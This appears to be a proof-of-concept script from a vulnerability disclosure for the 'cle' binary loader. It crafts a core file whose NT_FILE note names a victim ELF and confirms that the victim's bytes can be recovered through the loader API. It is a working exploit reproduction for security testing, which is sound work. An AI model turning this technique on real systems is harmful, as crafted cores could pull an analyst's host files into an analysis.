#!/usr/bin/env python3
"""PoC 1b - NT_FILE host-file ingestion with content capture (sink S1, see common.py).

A crafted core names a victim ELF; cle parses it and attaches it as a child object
of the analysis. The victim's original bytes (outside the one page the core's
PT_LOAD overwrites) are recoverable through the public loader API.

Expected on vulnerable cle: child attached, MARKER recovered verbatim.
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
import cle  # noqa: E402

from lib.builders import MARKER, MARKER_VADDR, build_core, build_victim_elf  # noqa: E402


def main():
    print(f"cle {cle.__version__}, {__file__.split('/')[-1]}")
    with tempfile.TemporaryDirectory() as td:
        victim = build_victim_elf(os.path.join(td, "victim.so"))
        core = os.path.join(td, "ingest.core")
        build_core([(0x400000, 0x401000, 0, victim)], core)

        ld = cle.Loader(core)
        kids = ld.main_object.child_objects
        print(f"  host file attached as child object: {len(kids) > 0}")
        if not kids:
            print("RESULT: NOT REPRODUCIBLE")
            return
        data = bytes(kids[0].memory.load(MARKER_VADDR, len(MARKER)))
        print(f"  bytes at victim vaddr {MARKER_VADDR:#x}: {data!r}")
        print("RESULT:", "VULNERABLE - attacker-named host file contents captured into the analysis"
              if data.startswith(MARKER[:-1]) else "NOT REPRODUCIBLE")


if __name__ == "__main__":
    main()
